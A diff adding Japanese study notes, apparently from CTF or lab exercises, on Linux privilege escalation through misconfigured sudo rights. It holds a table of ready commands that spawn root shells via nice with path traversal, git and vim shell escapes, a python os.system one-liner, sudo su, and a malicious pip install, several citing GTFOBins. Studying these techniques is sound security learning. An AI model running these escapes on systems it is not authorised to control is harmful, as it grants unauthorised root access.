@@ -1,3 +1,20 @@
+- `sudo -l`
+  - sudoの実行にはrootのパスワードがいるが、`sudo -l`に出てくるコマンドはパスワードがいらない
+  - sudoのコマンドは基本フルパスで書く。これはコマンドが複数あることがあるから
+  - `->`はターミナルがvimに切り替えているのを表している
+
+|chap|コマンド|参照|コメント|||
+|:--|:--|:--|:--|:--|:--|
+|1|sudo /bin/nice  /notes/../bin/bash||ディレクトリ トラバーサル|||
+|3|sudo git -p help config -> !/bin/sh|GTFOBins||||
+|4|sudo /usr/bin/vim -c -> !/bin/sh|GTFOBins||||
+|8|sudo /usr/bin/python -c 'import os;os.system("/bin/bash")'|GTFOBins||||
+|14|sudo su ||(ALL:ALL)ALLと表示されているので全権限が使える|||
+|15|sudo -u arsene /usr/lib/python3.9 /home/arsene/heist.py||heist.pyの中に/bin/bashが書いてある|||
+|15|sudo pip install $TF|GTFOBins|$TFはフォルダで、この中のファイルに/bin/shが書いてある|||
+
+
+
 ## sudo -lの設定の仕方
 - ParrotOSでする
 ### 説明
